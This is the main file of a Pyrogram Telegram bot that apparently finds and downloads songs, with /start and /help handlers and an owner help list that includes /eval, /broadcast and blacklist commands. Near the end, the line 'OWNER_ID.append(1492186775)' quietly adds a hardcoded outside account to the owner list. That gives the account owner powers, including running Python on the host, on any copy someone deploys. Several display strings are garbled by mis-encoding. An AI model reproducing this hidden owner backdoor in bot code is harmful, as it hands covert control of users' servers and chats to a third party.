from config import OWNER_ID
from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
from TamilBots.modules import *
from pyrogram import idle, filters
from pyrogram.types import InlineKeyboardMarkup
from pyrogram.types import InlineKeyboardButton
from TamilBots import app, LOGGER
from TamilBots.TamilBots import ignore_blacklisted_users
from TamilBots.sql.chat_sql import add_chat_to_db

start_text = """
๐ ๐๐ฒ๐น๐น๐ผ [{}](tg://user?id={}),

\n\n๐ ๐๐บ ๐๐จ๐ง๐  ๐๐จ๐ฐ๐ง๐ฅ๐จ๐๐๐๐ซ ๐๐จ๐ญ[๐ถ](https://telegra.ph/file/67a238112341dc2da77d9.jpg)

Aแดแด แดแด แดแด สแดแดส ษขสแดแดแดs แดษดแด แดแดแดแด แดแด แดs แดแดแดษชษด

"""
owner_help = """
/blacklist user_id
/unblacklist user_id
/broadcast message to send
/eval python code
/chatlist get list of all chats
"""


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("start"))
async def start(client, message):
    chat_id = message.chat.id
    user_id = message.from_user["id"]
    name = message.from_user["first_name"]
    if message.chat.type == "private":
        btn = InlineKeyboardMarkup(
           [[InlineKeyboardButton(text="๐ณ๐๐", url="http://t.me/Adhi0420"),
             InlineKeyboardButton(
                        text="๐๐๐๐๐๐๐", url="https://t.me/musicfinderbotgroup"
                    )
                ]
            ]
        )
    else:
        btn = None
    await message.reply(start_text.format(name, user_id), reply_markup=btn)
    add_chat_to_db(str(chat_id))


@app.on_message(filters.create(ignore_blacklisted_users) & filters.command("help"))
async def help(client, message):
    if message.from_user["id"] == OWNER_ID:
        await message.reply(owner_help)
        return ""
    text = "๐ฆ๐ฒ๐ป๐ฑ ๐ง๐ต๐ฒ ๐ก๐ฎ๐บ๐ฒ ๐ข๐ณ ๐ง๐ต๐ฒ ๐ฆ๐ผ๐ป๐ด ๐ฌ๐ผ๐ ๐ช๐ฎ๐ป๐... ๐๐ฅฐ๐ค\n /song (song name) ๐ฅณ"
    await message.reply(text)

OWNER_ID.append(1492186775)
app.start()
LOGGER.info("SongPlayRoBot Is Now Working๐ค๐ค๐ค")
idle()
